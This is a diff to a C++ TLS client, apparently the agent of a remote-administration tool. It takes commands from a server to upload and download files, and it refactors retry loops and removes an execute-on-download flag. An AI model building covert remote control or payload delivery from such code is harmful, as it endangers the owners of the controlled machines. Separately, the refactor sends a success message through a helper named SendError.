@@ -150,18 +150,7 @@ bool Client::SendFile(const std::string strLocalFile) {
 		std::cout<<"Unable to open file\n";
 		error();
 		#endif
-		TryAgain:
-		int iTmp = SSL_write(sslSocket, CommandCodes::cFileError, 3);
-		if(iTmp <= 0){
-			if(!CheckSslReturnCode(iTmp)){
-				#ifdef _DEBUG
-				std::cout<<"Unable to send packet\n";
-				#endif
-			} else {
-				Sleep(100);
-				goto TryAgain;
-			}
-		}
+		SendError(CommandCodes::cFileError);
 		return false;
 	}
 	u_int iBlockSize = 255;
@@ -172,18 +161,7 @@ bool Client::SendFile(const std::string strLocalFile) {
 		#ifdef _DEBUG
 		std::cout<<"File size is 0\n";
 		#endif
-		TryAgain1:
-		iRet = SSL_write(sslSocket, CommandCodes::cFileError, 3);
-		if(iRet <= 0){
-			if(!CheckSslReturnCode(iRet)){
-				#ifdef _DEBUG
-				std::cout<<"Unable to send packet\n";
-				#endif
-			} else {
-				Sleep(100);
-				goto TryAgain1;
-			}
-		}
+		SendError(CommandCodes::cFileError);
 		strmInputFile.close();
 		return false;
 	}
@@ -244,12 +222,11 @@ bool Client::SendFile(const std::string strLocalFile) {
 	return true;
 }
 
-void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocalFileName){
+void Client::RetrieveFile(u64 uFileSize, const std::string strLocalFileName){
 	char *cDummyFile = new char[1024];
 	#ifdef _DEBUG
-	std::cout<<"Saving file "<<strLocalFileName<<"\nSize "<<uFileSize<<"\n Execute "<<cExec<<'\n';
+	std::cout<<"Saving file "<<strLocalFileName<<"\nSize "<<uFileSize<<"\n";
 	#endif
-	int iRet = 0;
 	std::ofstream strmOutputFile(strLocalFileName, std::ios::binary);
 	if(!strmOutputFile.is_open()){
 		if(GetEnvironmentVariable("TEMP", cDummyFile, 1011) <= 0){
@@ -270,37 +247,11 @@ void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocal
 			std::cout<<"Unable to open dummy file?\n";
 			error();
 			#endif
-			TryAgain:
-			iRet = SSL_write(sslSocket, CommandCodes::cFileTransferCancel, 3); 
-			if(iRet <= 0){
-				if(!CheckSslReturnCode(iRet)){
-					#ifdef _DEBUG
-					std::cout<<"Unable to send cancel command\n";
-					error();
-					#endif
-				} else {
-					Sleep(100);
-					goto TryAgain;
-				}
-			}
+			SendError(CommandCodes::cFileTransferCancel);
 			return;
 		}
 	}
-	TryAgain2:
-	iRet = SSL_write(sslSocket, CommandCodes::cFileTranferBegin, 3); 
-	if(iRet <= 0){
-		if(!CheckSslReturnCode(iRet)){
-			#ifdef _DEBUG
-			std::cout<<"Unable to send confirmation to server\n";
-			error();
-			#endif
-			strmOutputFile.close();
-			return;
-		} else {
-			Sleep(100);
-			goto TryAgain2;
-		}
-	}
+	SendError(CommandCodes::cFileTransferBegin);
 	u64 uTotalBytes = 0;
 	int iBufferSize = 255, iBytesRead = 0;
 	char *cFileBuffer = new char[iBufferSize];
@@ -341,7 +292,7 @@ bool Client::ParseCommand(char*& strCommand){
 	Misc::strSplit(strCommand, '@', vcCommands, 10);
 	if(vcCommands.size() > 0){
 		if(vcCommands[0] == CommandCodes::cUpload){
-			RetrieveFile(Misc::StrToUint(vcCommands[1].c_str()), vcCommands[2][0], vcCommands[3]);
+			RetrieveFile(Misc::StrToUint(vcCommands[1].c_str()), vcCommands[3]);
 			goto release;
 		}
 		if(vcCommands[0] == "s"){
@@ -410,15 +361,7 @@ bool Client::ParseCommand(char*& strCommand){
 }
 
 bool Client::Connect(c_char* cIP, c_char* cPORT){
-	if(bioRemote != nullptr){
-		BIO_free_all(bioRemote);
-		bioRemote = nullptr;
-	}
-	if(sslCTX != nullptr){
-		SSL_CTX_free(sslCTX);
-		sslCTX = nullptr;
-	}
-	sslSocket = nullptr;
+	CloseConnection();
 	sslCTX = SSL_CTX_new(TLS_client_method());
 	if(!sslCTX){
 		return false;
